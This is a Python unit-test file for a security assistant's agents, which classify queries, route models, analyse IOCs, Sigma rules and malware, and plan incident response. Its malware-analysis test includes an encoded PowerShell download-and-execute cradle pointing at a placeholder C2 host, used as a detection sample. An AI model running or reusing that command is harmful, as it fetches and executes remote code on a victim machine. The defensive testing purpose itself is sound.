"""Tests unitaires pour les agents"""
import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))

from backend.agents.base import AgentContext
from backend.agents.query_classifier import QueryClassifierAgent
from backend.agents.model_router import ModelRouterAgent
from backend.agents.threat_intelligence import ThreatIntelligenceAgent
from backend.agents.sigma_analysis import SigmaAnalysisAgent
from backend.agents.malware_analysis import MalwareAnalysisAgent
from backend.agents.incident_response import IncidentResponseAgent


def test_query_classifier():
    agent = QueryClassifierAgent()
    ctx = AgentContext(query="Email phishing suspect: verification PayPal requise")
    result = asyncio.run(agent.execute(ctx))
    assert result.success
    assert result.output["primary_category"] == "phishing_analysis"
    print(f"[PASS] QueryClassifier: {result.output['primary_category']} (conf: {result.confidence})")


def test_query_classifier_soc():
    agent = QueryClassifierAgent()
    ctx = AgentContext(query="Alerte SOC: activite suspecte sur le serveur SQL")
    result = asyncio.run(agent.execute(ctx))
    assert result.success
    assert result.output["primary_category"] in ("siem_investigation", "general_security_question")
    print(f"[PASS] QueryClassifier SOC: {result.output['primary_category']}")


def test_query_classifier_general():
    agent = QueryClassifierAgent()
    ctx = AgentContext(query="Explique moi le principe de defense en profondeur")
    result = asyncio.run(agent.execute(ctx))
    assert result.success
    print(f"[PASS] QueryClassifier General: {result.output['primary_category']}")


def test_model_router():
    agent = ModelRouterAgent()
    ctx = AgentContext(query="Email phishing")
    ctx.intermediate_results["query_classifier"] = {"primary_category": "phishing_analysis", "alternatives": []}
    result = asyncio.run(agent.execute(ctx))
    assert result.success
    models = result.output["models"]
    assert len(models) > 0
    model_ids = [m["model_id"] for m in models]
    assert "cysecbert" in model_ids or "phishsense" in model_ids
    print(f"[PASS] ModelRouter: {[m['model_id'] for m in models]}")


def test_threat_intelligence():
    agent = ThreatIntelligenceAgent()
    ctx = AgentContext(query="Analyse les IOC: IP 185.234.72.18, domaine evil.xyz, hash d41d8cd98f00b204e9800998ecf8427e")
    result = asyncio.run(agent.execute(ctx))
    assert result.success
    assert result.output["iocs_found"] > 0
    print(f"[PASS] ThreatIntel: {result.output['iocs_found']} IOC trouves, risque: {result.output['risk_summary']['assessment']}")


def test_sigma_analysis():
    agent = SigmaAnalysisAgent()
    ctx = AgentContext(query="""title: Suspicious PowerShell
status: test
description: Detects suspicious PowerShell
level: high
tags:
  - attack.t1059.001
detection:
  selection:
    EventID: 4104
  condition: selection""")
    result = asyncio.run(agent.execute(ctx))
    assert result.success
    print(f"[PASS] SigmaAnalysis: score={result.output['quality']['score']}, techniques={result.output['mitre_coverage']['techniques_mapped']}")


def test_malware_analysis():
    agent = MalwareAnalysisAgent()
    ctx = AgentContext(query="Processus inconnu: powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAHcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC0AcwBlAHIAdgBlAHIALgB0AG8AcgAuAG4AZQB0AHcAbwByAGsALwBgACkA")
    result = asyncio.run(agent.execute(ctx))
    assert result.success
    print(f"[PASS] MalwareAnalysis: categories={result.output['categories_identified']}, severite={result.output['overall_severity']}")


def test_incident_response():
    agent = IncidentResponseAgent()
    ctx = AgentContext(query="Ransomware detecte sur le serveur DC-01. Chiffrement des donnees en cours.")
    result = asyncio.run(agent.execute(ctx))
    assert result.success
    plan = result.output
    assert "phases" in plan
    assert plan["incident"]["severity"] in ("CRITICAL", "HIGH")
    print(f"[PASS] IncidentResponse: severite={plan['incident']['severity']}, phases={list(plan['phases'].keys())}")


if __name__ == "__main__":
    test_query_classifier()
    test_query_classifier_soc()
    test_query_classifier_general()
    test_model_router()
    test_threat_intelligence()
    test_sigma_analysis()
    test_malware_analysis()
    test_incident_response()
    print("\n[OK] Tous les tests agents passes!")
